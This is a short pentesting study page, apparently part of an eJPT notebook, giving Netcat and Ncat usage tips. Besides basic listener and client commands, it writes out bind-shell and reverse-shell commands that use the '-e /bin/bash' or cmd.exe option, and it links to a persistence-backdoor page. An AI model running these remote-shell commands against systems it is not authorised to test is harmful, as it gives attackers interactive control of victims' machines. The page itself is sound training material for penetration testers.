---
description: nc(Netcat) & Ncat tips and tricks for PenTesters.
---

# 👂Netcat

> &#x20;**Ncat is a modern reinvention of Netcat**. Ncat includes several features not available in Hobbit's original version of the tool. ... For example, while the traditional Netcat has a simple port scanning feature, Ncat lacks that feature because Nmap can be used more effectively for that purpose.

## Ncat vs Netcat:

Here are some key new features available in Ncat but absent in Netcat:

* Connection brokering
* Proxy connections
* SSL support
* IPv6 support
* Possibility to chain Ncat’s together

## Netcat (nc)

Used to conn. to an HTTP server to enumerate/attack HTTP methods

{% content-ref url="../pentesting/ejpt/web-attacks.md" %}
[web-attacks.md](../pentesting/ejpt/web-attacks.md)
{% endcontent-ref %}

1-Starting a listener(server):

```
nc -lvp <port>
```

2-Starting a client:

```
nc -v <Listner_ip> <port>
```

> \-v: verbos

{% hint style="info" %}
\-u: added to both server/client to start a UDP session.

`>output.txt`: for server to save a file.

`echo "msg" |`: for client to send & close conn. immediately. (or cat a file to send it)
{% endhint %}

#### Get a shell after hacking in device(Bind shell):

```bash
nc -lvp <port> -e /bin/bash
```

> \-e: excute a programe (cmd.exe for windows).t
>
> then in the attacker computer starta client.

## Ncat

For example, we can have a connection (Target is listening and waiting for the Attacker).

in Target/Victim Machine:

```
ncat -l -p <port> -e <prog>
```

> \-l: to listen.
>
> \-p: choose an open port on Target mahcine.
>
> \-e: programe to excute (Win: cmd.exe Unix: /bin/bash).&#x20;

in Attacker Machine:

```
ncat <target_ip> <target_port>
```

### Reverse Conn:

helpful when the attack is over WAN (here Attacker has the listener):

Attacker Machine:

```
ncat -l -p <open_port> -v
```

> \-p: open port (pay attaention for Egress firewall in the Target Network).
>
> \-v: give us verbose info.

Target Machine:

```
ncat -e <prog_exec> <target_IP> <target_port>
```

> \-e: programe to excute (Win: cmd.exe Unix: /bin/bash).&#x20;
>
> \-p: same port the attacker is listening in.

### Persistence achieved with a Backdoor:

go check the [#persistent-backdoor](../pentesting/ejpt/system-attacks.md#persistent-backdoor "mention") page in ⚙ Sys Attacks for steps in Win machines.
